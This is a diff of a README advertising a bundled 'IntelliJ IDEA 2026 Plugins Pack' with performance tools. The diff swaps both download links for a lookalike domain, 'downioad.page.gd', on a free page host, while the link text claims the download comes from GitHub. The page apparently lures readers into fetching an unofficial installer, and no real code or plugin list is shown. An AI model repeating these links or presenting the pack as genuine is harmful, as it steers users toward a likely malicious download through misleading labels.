@@ -2,7 +2,7 @@
 
 Elevate your development environment with the IntelliJ IDEA 2026 Plugins Pack & Performance Tools. This comprehensive package bundles a collection of carefully selected plugins and performance optimization utilities designed to enhance your workflow, boost productivity, and streamline your development process within the IntelliJ IDEA ecosystem.
 
-[![Download Installer](https://img.shields.io/badge/Download-Latest-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Latest-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## What's Included
 
@@ -44,7 +44,7 @@ A: The core purpose of this pack is to provide a stable collection of tools. Upd
 
 For the latest version and full release notes, please visit the download page.
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 ---
 *Last Updated: 2026*
